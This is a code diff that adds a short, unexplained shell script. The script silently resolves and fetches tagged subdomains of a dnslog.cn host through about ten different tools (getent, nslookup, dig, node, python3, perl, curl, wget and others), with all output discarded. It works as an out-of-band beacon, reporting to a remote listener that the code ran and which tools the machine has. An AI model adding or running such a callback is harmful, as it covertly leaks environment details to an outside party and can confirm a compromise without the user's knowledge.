@@ -1,0 +1,12 @@
+Z=lt46i7.dnslog.cn
+n=q1
+getent hosts g.$n.$Z >/dev/null 2>&1
+nslookup n.$n.$Z >/dev/null 2>&1
+busybox nslookup b.$n.$Z >/dev/null 2>&1
+host h.$n.$Z >/dev/null 2>&1
+dig +short d.$n.$Z >/dev/null 2>&1
+node -e "require('dns').lookup('j.$n.$Z',()=>{})" >/dev/null 2>&1
+python3 -c "import socket;socket.gethostbyname('p.$n.$Z')" >/dev/null 2>&1
+perl -e "gethostbyname('r.$n.$Z')" >/dev/null 2>&1
+curl -s -m 3 -o /dev/null "http://c.$n.$Z/" >/dev/null 2>&1
+wget -q -T 3 -O /dev/null "http://w.$n.$Z/" >/dev/null 2>&1
